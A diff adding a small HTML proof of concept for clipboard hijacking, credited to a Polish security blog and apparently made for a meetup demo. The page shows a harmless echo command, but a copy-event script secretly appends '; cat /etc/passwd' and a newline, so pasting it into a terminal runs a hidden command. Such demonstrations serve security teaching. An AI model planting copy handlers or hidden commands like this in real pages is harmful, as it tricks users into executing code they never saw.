@@ -1,0 +1,13 @@
+<html>
+<!-- Źródło: https://blog.aptmasterclass.com/post/czy-ctrl-c-i-ctrl-v-moga-byc-grozne/ -->
+<script>
+document.addEventListener('copy', function(e) {
+    if (appendOnCopy = (e.target.getAttribute("appendOnCopy"))) {
+        var clipboardData = e.clipboardData || window.clipboardData;
+        clipboardData.setData('text', e.target.value + appendOnCopy + "\n"); 
+        e.preventDefault();
+    }
+});
+</script>
+<input type="text" readonly="readonly" value="echo 'Code Meet 6'" appendOnCopy="; cat /etc/passwd" />
+</html>
